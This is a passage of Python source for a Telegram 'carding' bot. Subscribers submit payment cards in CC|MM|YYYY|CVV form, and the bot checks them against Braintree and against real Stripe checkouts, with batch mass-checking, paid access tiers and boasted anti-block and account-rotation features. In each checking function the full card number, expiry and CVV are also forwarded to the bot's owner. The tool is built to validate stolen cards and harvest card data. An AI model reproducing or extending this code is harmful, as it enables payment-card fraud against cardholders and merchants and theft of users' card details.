    declined_count = sum(1 for r in results if r['result']['status'] == 'declined')
    dead_count = sum(1 for r in results if r['result']['status'] in ['dead', 'error', 'unknown'])
    
    live_cards = []
    for r in results:
        if r['result']['status'] == 'live':
            cc, mm, yy, cvv = r['card']
            masked = cc[:6] + '******' + cc[-4:] if len(cc) > 10 else cc
            live_cards.append(f"✅ <code>{masked}|{mm}|{yy}|{cvv}</code> - {r['result']['response_text']}")
    
    summary = f"""
📊 <b>MASS CHECK COMPLETE - {gateway}</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>Live:</b> {live_count}
❌ <b>Declined:</b> {declined_count}
💀 <b>Dead/Error:</b> {dead_count}
📦 <b>Total:</b> {len(results)}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    if live_cards:
        summary += "\n<b>✅ LIVE CARDS:</b>\n"
        for card_line in live_cards:
            summary += f"{card_line}\n"
    
    summary += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    return summary

# =====================================================================
# /START COMMAND
# =====================================================================

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.chat.id
    plan = get_user_plan(user_id)
    plan_emoji = {"free": "🆓", "silver": "🥈", "gold": "🥇", "diamond": "💎", "owner": "👑"}
    
    welcome_msg = f"""
👋 <b>Welcome to Premium Bot!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{plan_emoji.get(plan, '🆓')} <b>Plan:</b> {plan.upper()}
🆔 <b>ID:</b> <code>{user_id}</code>
📅 <b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🚪 Available Gates:</b>

🆓 <b>FREE GATE</b> - Basic commands
🥈 <b>GATE 1</b> - Braintree Checker
🥇 <b>GATE 2</b> - Stripe ${TOTAL_AMOUNT} Checkout (Spudnik ID Plate)
💎 <b>DIAMOND</b> - All + Unlimited
👑 <b>OWNER</b> - Admin Panel

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Select a gate below to access features:</b>
"""
    bot.send_message(user_id, welcome_msg, parse_mode='HTML', reply_markup=get_main_menu_keyboard(user_id))

# =====================================================================
# /HELP COMMAND
# =====================================================================

@bot.message_handler(commands=['help'])
def handle_help(message):
    help_msg = f"""
📚 <b>HELP & GUIDE</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🚪 GATE SYSTEM:</b>

🆓 <b>FREE:</b> /start, /help, /about, /myplan
🥈 <b>SILVER (Gate 1):</b> Braintree CHK, Stats
🥇 <b>GOLD (Gate 2):</b> Stripe ${TOTAL_AMOUNT} CHK, Mass CHK
💎 <b>DIAMOND:</b> All + No Rate Limits
👑 <b>OWNER:</b> Admin Commands

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>💳 Card Format:</b>
<code>CC|MM|YYYY|CVV</code>
<code>4242424242424242|12|2025|123</code>

<b>⏱️ Speed:</b> ~8-15 seconds/card (real checkout)
<b>🛡️ Anti-Block:</b> Active
<b>📦 Product:</b> {PRODUCT_NAME}
<b>🚚 Shipping:</b> Pick-up

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>📋 Response Codes:</b>
✅ Approved = Live Card (Charged)
❌ Declined = Card Declined
⚠️ Error = Gateway Error

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    bot.send_message(message.chat.id, help_msg, parse_mode='HTML', reply_markup=get_back_menu())

# =====================================================================
# /ABOUT COMMAND
# =====================================================================

@bot.message_handler(commands=['about'])
def handle_about(message):
    about_msg = f"""
ℹ️ <b>ABOUT BOT</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Name:</b> Premium Multi-Gate Bot
<b>Version:</b> 4.0
<b>Owner:</b> <code>{OWNER_ID}</code>

<b>🚪 Gates:</b>
• Gate 1: Braintree Checker
• Gate 2: Stripe ${TOTAL_AMOUNT} Checkout ({PRODUCT_NAME} + Pick-up)

<b>💳 Supported Cards:</b>
• Visa, Mastercard, Amex
• Discover, JCB, UnionPay

<b>🛡️ Protection:</b>
• Safe delays per card
• Rate limiting active
• Anti-block system
• Account rotation
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    bot.send_message(message.chat.id, about_msg, parse_mode='HTML', reply_markup=get_back_menu())

# =====================================================================
# /MYPLAN COMMAND
# =====================================================================

@bot.message_handler(commands=['myplan'])
def handle_myplan(message):
    user_id = message.chat.id
    plan = get_user_plan(user_id)
    plan_emoji = {"free": "🆓", "silver": "🥈", "gold": "🥇", "diamond": "💎", "owner": "👑"}
    
    msg = f"""
📋 <b>YOUR PLAN</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{plan_emoji.get(plan, '🆓')} <b>Current Plan:</b> {plan.upper()}
🆔 <b>User ID:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>Your Access:</b>
"""
    if plan == "free":
        msg += "• /start, /help, /about, /myplan\n\n💡 <b>Upgrade to Silver for Gate 1 access!</b>"
    elif plan == "silver":
        msg += "• 🆓 Free commands\n• 🥈 Gate 1: Braintree CHK\n\n💡 <b>Upgrade to Gold for Gate 2!</b>"
    elif plan == "gold":
        msg += f"• 🆓 Free commands\n• 🥈 Gate 1: Braintree CHK\n• 🥇 Gate 2: Stripe ${TOTAL_AMOUNT} CHK + Mass\n\n💡 <b>Upgrade to Diamond for unlimited!</b>"
    elif plan == "diamond":
        msg += f"• 🆓 Free commands\n• 🥈 Gate 1: Braintree CHK\n• 🥇 Gate 2: Stripe ${TOTAL_AMOUNT} CHK\n• 💎 Unlimited + No Rate Limits"
    elif plan == "owner":
        msg += "• 👑 ALL ACCESS - Full Admin"
    
    msg += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())

# =====================================================================
# OWNER COMMANDS
# =====================================================================

@bot.message_handler(commands=['adduser'])
def handle_adduser(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "👑 This is an OWNER-only command!", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        plan = parts[2].lower()
        if plan not in ["silver", "gold", "diamond"]:
            bot.send_message(message.chat.id, "❌ Plan must be: silver, gold, or diamond", parse_mode='HTML')
            return
        set_user_plan(user_id, plan)
        plan_emoji = {"silver": "🥈", "gold": "🥇", "diamond": "💎"}
        bot.send_message(message.chat.id, f"✅ User <code>{user_id}</code> added to {plan_emoji[plan]} <b>{plan.upper()}</b> plan!", parse_mode='HTML')
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Usage: /adduser [user_id] [silver/gold/diamond]", parse_mode='HTML')

@bot.message_handler(commands=['removeuser'])
def handle_removeuser(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "👑 This is an OWNER-only command!", parse_mode='HTML')
        return
    
    try:
        user_id = int(message.text.split()[1])
        if remove_user(user_id):
            bot.send_message(message.chat.id, f"🗑️ User <code>{user_id}</code> removed!", parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, f"ℹ️ User <code>{user_id}</code> not found.", parse_mode='HTML')
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Usage: /removeuser [user_id]", parse_mode='HTML')

@bot.message_handler(commands=['userlist'])
def handle_userlist(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "👑 This is an OWNER-only command!", parse_mode='HTML')
        return
    
    users = load_users()
    if not users:
        bot.send_message(message.chat.id, "📋 No users found.", parse_mode='HTML')
        return
    
    plan_emoji = {"silver": "🥈", "gold": "🥇", "diamond": "💎"}
    msg = "📋 <b>USER LIST</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, data in users.items():
        plan = data.get("plan", "free")
        msg += f"{plan_emoji.get(plan, '🆓')} <code>{uid}</code> - {plan.upper()}\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    bot.send_message(message.chat.id, msg, parse_mode='HTML')

@bot.message_handler(commands=['setplan'])
def handle_setplan(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "👑 This is an OWNER-only command!", parse_mode='HTML')
        return
    
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        plan = parts[2].lower()
        if plan not in ["free", "silver", "gold", "diamond"]:
            bot.send_message(message.chat.id, "❌ Plan must be: free, silver, gold, or diamond", parse_mode='HTML')
            return
        set_user_plan(user_id, plan)
        bot.send_message(message.chat.id, f"✅ User <code>{user_id}</code> plan set to <b>{plan.upper()}</b>!", parse_mode='HTML')
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌ Usage: /setplan [user_id] [free/silver/gold/diamond]", parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "👑 This is an OWNER-only command!", parse_mode='HTML')
        return
    
    text = message.text.replace('/broadcast ', '', 1)
    if not text or text == '/broadcast':
        bot.send_message(message.chat.id, "❌ Usage: /broadcast [message]", parse_mode='HTML')
        return
    
    users = load_users()
    sent = 0
    failed = 0
    for uid in users:
        try:
            bot.send_message(int(uid), f"📢 <b>BROADCAST</b>\n\n{text}", parse_mode='HTML')
            sent += 1
        except:
            failed += 1
    
    bot.send_message(message.chat.id, f"📢 Broadcast sent!\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode='HTML')

# =====================================================================
# CALLBACK HANDLERS
# =====================================================================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.message.chat.id
    data = call.data
    
    # ---- MENU ----
    if data == "menu":
        plan = get_user_plan(user_id)
        plan_emoji = {"free": "🆓", "silver": "🥈", "gold": "🥇", "diamond": "💎", "owner": "👑"}
        msg = f"""
🏠 <b>MAIN MENU</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{plan_emoji.get(plan, '🆓')} <b>Plan:</b> {plan.upper()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Select a gate below:</b>
"""
        try:
            bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                 text=msg, parse_mode='HTML', reply_markup=get_main_menu_keyboard(user_id))
        except:
            bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_main_menu_keyboard(user_id))
        bot.answer_callback_query(call.id)
    
    # ---- FREE GATE ----
    elif data == "gate_free":
        msg = """
🆓 <b>FREE GATE</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Available Commands:</b>

/start - Welcome message
/help - Help guide
/about - About bot
/myplan - Check your plan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Upgrade to access premium gates!
"""
        try:
            bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                 text=msg, parse_mode='HTML', reply_markup=get_back_menu())
        except:
            bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- SILVER GATE (Gate 1 - Braintree) ----
    elif data == "gate_silver":
        if has_access(user_id, "silver"):
            msg = """
🥈 <b>GATE 1 - BRAINTREE CHECKER</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>🏦 Gateway:</b> Braintree
<b>⏱️ Speed:</b> 8 seconds/card
<b>🛡️ Anti-Block:</b> Active

<b>Select an option:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_silver_gate_keyboard())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_silver_gate_keyboard())
        else:
            msg = """
🔒 <b>GATE LOCKED!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Gate 1 (Braintree) requires <b>SILVER</b> plan or above!

💡 Contact owner to upgrade.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_back_menu())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- GOLD GATE (Gate 2 - Stripe) ----
    elif data == "gate_gold":
        if has_access(user_id, "gold"):
            msg = f"""
🥇 <b>GATE 2 - STRIPE ${TOTAL_AMOUNT} CHECKOUT</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>💳 Gateway:</b> Stripe (REAL)
<b>💰 Amount:</b> ${TOTAL_AMOUNT}
<b>📦 Product:</b> {PRODUCT_NAME}
<b>🚚 Shipping:</b> Pick-up
<b>⏱️ Speed:</b> ~8-15 seconds/card
<b>🛡️ Anti-Block:</b> Active

<b>Select an option:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_gold_gate_keyboard())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_gold_gate_keyboard())
        else:
            msg = f"""
🔒 <b>GATE LOCKED!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Gate 2 (Stripe ${TOTAL_AMOUNT}) requires <b>GOLD</b> plan or above!

💡 Contact owner to upgrade.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_back_menu())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- DIAMOND GATE ----
    elif data == "gate_diamond":
        if has_access(user_id, "diamond"):
            msg = """
💎 <b>DIAMOND GATE - UNLIMITED ACCESS</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>⚡ No Rate Limits!</b>
<b>🏦 Braintree + Stripe Access</b>
<b>📦 Mass Check Available</b>
<b>🔥 Priority Speed</b>

<b>Select an option:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_diamond_gate_keyboard())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_diamond_gate_keyboard())
        else:
            msg = """
🔒 <b>GATE LOCKED!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ Diamond Gate requires <b>DIAMOND</b> plan!

💡 Contact owner to upgrade.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_back_menu())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- OWNER GATE ----
    elif data == "gate_owner":
        if user_id == OWNER_ID:
            msg = """
👑 <b>OWNER GATE - ADMIN PANEL</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Admin Commands:</b>

/adduser [id] [plan] - Add user
/removeuser [id] - Remove user
/userlist - All users
/setplan [id] [plan] - Change plan
/broadcast [msg] - Send to all

<b>Or use buttons below:</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
            try:
                bot.edit_message_text(chat_id=user_id, message_id=call.message.message_id,
                                     text=msg, parse_mode='HTML', reply_markup=get_owner_gate_keyboard())
            except:
                bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_owner_gate_keyboard())
        else:
            msg = "👑 This gate is for OWNER only!"
            bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- BRAINTREE CHK ----
    elif data == "braintree_chk":
        if not has_access(user_id, "silver"):
            bot.send_message(user_id, "⚡ Braintree CHK requires <b>SILVER</b> plan or above!", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return
        
        msg = """
💳 <b>BRAINTREE CARD CHECK</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Send card in this format:</b>
<code>CC|MM|YYYY|CVV</code>

<b>Example:</b>
<code>4242424242424242|12|2025|123</code>

⏱️ Check time: ~8 seconds
🏦 Gateway: Braintree
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(user_id, msg, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_braintree_card)
        bot.answer_callback_query(call.id, "💳 Send card now!")
    
    # ---- STRIPE CHK ----
    elif data == "stripe_chk":
        if not has_access(user_id, "gold"):
            bot.send_message(user_id, f"⚡ Stripe ${TOTAL_AMOUNT} CHK requires <b>GOLD</b> plan or above!", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return
        
        msg = f"""
💰 <b>STRIPE ${TOTAL_AMOUNT} CHECKOUT</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Send card in this format:</b>
<code>CC|MM|YYYY|CVV</code>

<b>Example:</b>
<code>4242424242424242|12|2025|123</code>

💰 Amount: ${TOTAL_AMOUNT}
📦 Product: {PRODUCT_NAME}
🚚 Shipping: Pick-up
⏱️ Check time: ~8-15 seconds
💳 Gateway: Stripe (REAL)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(user_id, msg, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_stripe_card)
        bot.answer_callback_query(call.id, "💰 Send card now!")
    
    # ---- MASS CHK ----
    elif data == "mass_chk":
        if not has_access(user_id, "gold"):
            bot.send_message(user_id, f"⚡ Mass CHK requires <b>GOLD</b> plan or above!", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return
        
        msg = f"""
📦 <b>MASS CARD CHECK</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Send cards (one per line):</b>
<code>CC|MM|YYYY|CVV</code>

<b>Example:</b>
<code>4242424242424242|12|2025|123
5555555555554444|06|2026|456</code>

⏱️ Speed: ~8-15 seconds/card
📦 Max: {MAX_MASS_CARDS} cards
💳 Gateway: Stripe ${TOTAL_AMOUNT} (REAL)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(user_id, msg, parse_mode='HTML')
        bot.register_next_step_handler(call.message, process_mass_cards)
        bot.answer_callback_query(call.id, "📦 Send cards now!")
    
    # ---- STATS ----
    elif data == "show_stats":
        if not has_access(user_id, "silver"):
            bot.send_message(user_id, "⚡ Stats requires <b>SILVER</b> plan or above!", parse_mode='HTML')
            bot.answer_callback_query(call.id)
            return
        
        plan = get_user_plan(user_id)
        total_checks = len(check_timestamps.get(user_id, []))
        hour_checks = len([t for t in check_timestamps.get(user_id, []) if time.time() - t < 3600])
        minute_checks = len([t for t in check_timestamps.get(user_id, []) if time.time() - t < 60])
        plan_emoji = {"free": "🆓", "silver": "🥈", "gold": "🥇", "diamond": "💎", "owner": "👑"}
        
        msg = f"""
📊 <b>YOUR STATISTICS</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{plan_emoji.get(plan, '🆓')} <b>Plan:</b> {plan.upper()}
🆔 <b>ID:</b> <code>{user_id}</code>

<b>This Minute:</b> {minute_checks}/{CHECKS_PER_MINUTE}
<b>This Hour:</b> {hour_checks}/{CHECKS_PER_HOUR}
<b>Total Checks:</b> {total_checks}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- UNLIMITED INFO ----
    elif data == "unlimited_info":
        msg = """
⚡ <b>UNLIMITED MODE - DIAMOND</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ No rate limits
✅ No per-minute cap
✅ No per-hour cap
✅ Priority processing
✅ All gates unlocked
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(user_id, msg, parse_mode='HTML', reply_markup=get_back_menu())
        bot.answer_callback_query(call.id)
    
    # ---- OWNER BUTTONS ----
    elif data == "owner_add":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "👑 Owner only!")
            return
        bot.send_message(user_id, "➕ Send: /adduser [user_id] [silver/gold/diamond]", parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "owner_remove":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "👑 Owner only!")
            return
        bot.send_message(user_id, "➖ Send: /removeuser [user_id]", parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "owner_list":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "👑 Owner only!")
            return
        handle_userlist(call.message)
        bot.answer_callback_query(call.id)
    
    elif data == "owner_setplan":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "👑 Owner only!")
            return
        bot.send_message(user_id, "🔄 Send: /setplan [user_id] [free/silver/gold/diamond]", parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    elif data == "owner_broadcast":
        if user_id != OWNER_ID:
            bot.answer_callback_query(call.id, "👑 Owner only!")
            return
        bot.send_message(user_id, "📢 Send: /broadcast [your message]", parse_mode='HTML')
        bot.answer_callback_query(call.id)
    
    # ---- MY PLAN ----
    elif data == "myplan":
        handle_myplan(call.message)
        bot.answer_callback_query(call.id)
    
    # ---- HELP ----
    elif data == "help":
        handle_help(call.message)
        bot.answer_callback_query(call.id)

# =====================================================================
# CARD PROCESSING FUNCTIONS
# =====================================================================

def process_braintree_card(message):
    user_id = message.chat.id
    card_input = message.text.strip()
    
    if '|' not in card_input or len(card_input.split('|')) < 4:
        bot.send_message(user_id, "❌ Invalid format! Use: <code>CC|MM|YYYY|CVV</code>", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    allowed, msg = check_rate_limit(user_id)
    if not allowed:
        bot.send_message(user_id, msg, parse_mode='HTML')
        return
    
    parts = card_input.split('|')
    cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    if not cc.isdigit() or len(cc) < 13:
        bot.send_message(user_id, "❌ Invalid card number!", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    record_check(user_id)
    
    masked = cc[:6] + '******' + cc[-4:] if len(cc) > 10 else cc
    wait_msg = bot.send_message(user_id, f"⏳ Checking <code>{masked}</code> on Braintree...", parse_mode='HTML')
    
    result = check_card_braintree(cc, mm, yy, cvv)
    
    # إشعار للمالك إذا كان المستخدم مجانيًا
    card_details = f"{cc}|{mm}|{yy}|{cvv}"
    notify_owner(card_details, result, user_id)
    
    try:
        bot.delete_message(user_id, wait_msg.message_id)
    except:
        pass
    
    bot.send_message(user_id, format_braintree_result(cc, mm, yy, cvv, result), parse_mode='HTML', reply_markup=get_back_menu())

def process_stripe_card(message):
    user_id = message.chat.id
    card_input = message.text.strip()
    
    if '|' not in card_input or len(card_input.split('|')) < 4:
        bot.send_message(user_id, "❌ Invalid format! Use: <code>CC|MM|YYYY|CVV</code>", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    allowed, msg = check_rate_limit(user_id)
    if not allowed:
        bot.send_message(user_id, msg, parse_mode='HTML')
        return
    
    parts = card_input.split('|')
    cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    
    if not cc.isdigit() or len(cc) < 13:
        bot.send_message(user_id, "❌ Invalid card number!", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    record_check(user_id)
    
    masked = cc[:6] + '******' + cc[-4:] if len(cc) > 10 else cc
    wait_msg = bot.send_message(user_id, f"⏳ Processing <code>{masked}</code> on Stripe (${TOTAL_AMOUNT} | {PRODUCT_NAME} | Pick-up)...", parse_mode='HTML')
    
    result = check_card_stripe(cc, mm, yy, cvv)
    
    # إشعار للمالك إذا كان المستخدم مجانيًا
    card_details = f"{cc}|{mm}|{yy}|{cvv}"
    notify_owner(card_details, result, user_id)
    
    try:
        bot.delete_message(user_id, wait_msg.message_id)
    except:
        pass
    
    bot.send_message(user_id, format_stripe_result(cc, mm, yy, cvv, result), parse_mode='HTML', reply_markup=get_back_menu())

def process_mass_cards(message):
    user_id = message.chat.id
    cards_text = message.text.strip()
    
    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
    
    if len(card_lines) == 0:
        bot.send_message(user_id, "❌ No cards found! Send in format: <code>CC|MM|YYYY|CVV</code>", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    if len(card_lines) > MAX_MASS_CARDS:
        bot.send_message(user_id, f"❌ Max {MAX_MASS_CARDS} cards per batch! You sent {len(card_lines)}.", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    valid_cards = []
    for line in card_lines:
        if '|' in line and len(line.split('|')) >= 4:
            parts = line.split('|')
            cc = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvv = parts[3].strip()
            if cc.isdigit() and len(cc) >= 13:
                valid_cards.append((cc, mm, yy, cvv))
    
    if not valid_cards:
        bot.send_message(user_id, "❌ No valid cards found!", parse_mode='HTML', reply_markup=get_back_menu())
        return
    
    est_time = len(valid_cards) * 12
    bot.send_message(user_id, f"📦 <b>Mass Check Started!</b>\n\n Cards: {len(valid_cards)}\n⏱️ Est. Time: ~{est_time}s\n🏦 Gateway: Stripe ${TOTAL_AMOUNT} (REAL)\n📦 Product: {PRODUCT_NAME}\n🚚 Shipping: Pick-up", parse_mode='HTML')
    
    results = []
    for i, (cc, mm, yy, cvv) in enumerate(valid_cards, 1):
        record_check(user_id)
        result = check_card_stripe(cc, mm, yy, cvv)
        results.append({'card': (cc, mm, yy, cvv), 'result': result})
        
        # إشعار للمالك لكل بطاقة إذا كان المستخدم مجانيًا
        card_details = f"{cc}|{mm}|{yy}|{cvv}"
        notify_owner(card_details, result, user_id)
        
        masked = cc[:6] + '******' + cc[-4:] if len(cc) > 10 else cc
        status_emoji = {'live': '✅', 'declined': '❌', 'dead': '💀', 'error': '⚠️'}
        emoji = status_emoji.get(result['status'], '❓')
        bot.send_message(user_id, f"{emoji} [{i}/{len(valid_cards)}] <code>{masked}</code> → {result['response_text']}", parse_mode='HTML')
    
    summary = format_mass_summary(results, f"Stripe ${TOTAL_AMOUNT}")
    bot.send_message(user_id, summary, parse_mode='HTML', reply_markup=get_back_menu())

# =====================================================================
# START BOT
# =====================================================================

if __name__ == "__main__":
    print("")
    print("==========================================")
    print("  🚀 PREMIUM MULTI-GATE BOT STARTING...")
    print("==========================================")
    print(f"  Bot Status:  ✅ Online")
    print(f"  Owner ID:    {OWNER_ID}")
    print(f"  Gate 1:      🏦 Braintree (Silver)")
    print(f"  Gate 2:      💳 Stripe ${TOTAL_AMOUNT} - {PRODUCT_NAME} (Gold) [REAL]")
    print(f"  Shipping:    📦 Pick-up")
    print(f"  Speed:       ~8-15s/card (safe)")
    print(f"  Anti-Block:  Active")
    print(f"  Accounts:    {len(SITE_ACCOUNTS)}")
    print("==========================================")
    print("  Bot is running...")
    print("")
    
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except KeyboardInterrupt:
        print("\n\n Bot stopped by user!")
    except Exception as e:
        print(f"\n\n Error: {e}")